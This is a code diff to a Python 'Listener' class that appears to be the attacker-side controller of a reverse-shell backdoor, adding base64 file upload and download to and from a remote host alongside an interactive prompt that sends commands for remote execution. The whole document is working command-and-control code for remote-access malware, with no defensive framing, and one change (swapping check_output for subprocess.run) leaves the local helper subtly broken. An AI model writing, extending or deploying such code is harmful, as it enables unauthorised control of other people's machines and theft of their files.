@@ -2,9 +2,10 @@
 import socket
 import subprocess
 import json
+import base64
 
 def execute_system_command(command):
-    return subprocess.check_output(command, shell=True)
+    return subprocess.run(command, capture_output=True)
 
 class Listener:
     def __init__(self, ip, port):
@@ -18,7 +19,7 @@ class Listener:
 
     def reliable_send(self, data):
         json_data = json.dumps(data)
-        self.connection.send(json_data.encode('utf-8'))
+        self.connection.send(json_data.encode())
 
     def reliable_receive(self):
         json_data = b""
@@ -28,6 +29,15 @@ class Listener:
                 return json.loads(json_data.decode())
             except ValueError:
                 continue
+
+    def write_file(self, path, content):
+        with open(path,'wb') as file:
+            file.write(base64.b64decode(content.encode()))
+            return "[+] Download successful."
+
+    def read_file(self, path):
+        with open(path, 'rb') as file:
+            return base64.b64encode(file.read())
 
     def execute_remotely(self, command):
         self.reliable_send(command)
@@ -41,7 +51,19 @@ class Listener:
         while True:
             command = input(">>")
             command = command.split(" ")
-            result = self.execute_remotely(command)
+            try:
+                if command[0] == 'upload':
+                    file_content = self.read_file(command[1])
+                    command.append(file_content.decode())
+    
+                result = self.execute_remotely(command)
+    
+                if command[0] == 'download' and '[-] Error' not in result:
+                    result = self.write_file(command[1], result)
+            except Exception:
+                result = "[-] Error occured during command execution"
+
+
             print(result)
 
 
